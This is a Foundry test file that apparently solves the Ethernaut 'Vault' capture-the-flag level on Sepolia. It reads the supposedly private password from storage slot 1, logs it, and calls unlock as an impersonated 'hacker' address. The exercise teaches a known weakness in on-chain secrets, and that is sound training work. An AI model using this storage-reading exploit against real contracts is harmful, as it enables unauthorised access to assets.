//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/level8.sol";
import {console} from "forge-std/console.sol";

contract level8Test is Test {
    Vault target;
    bytes32 password;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = Vault(instanceAddress);
        password = vm.load(address(target), bytes32(uint256(1)));
        console.logBytes32(password);
    }

    function testSolvesLeve8() public {
        address hacker = makeAddr("hacker");
        vm.startPrank(hacker);
        target.unlock(password);
        vm.stopPrank();
        assertTrue(target.locked() == false);
    }
}
//INSTANCE_AD=0x2610791E64b68CdA42A3F9958665fddBc53cBcFD forge test --mt testSolvesLeve8 -vvv
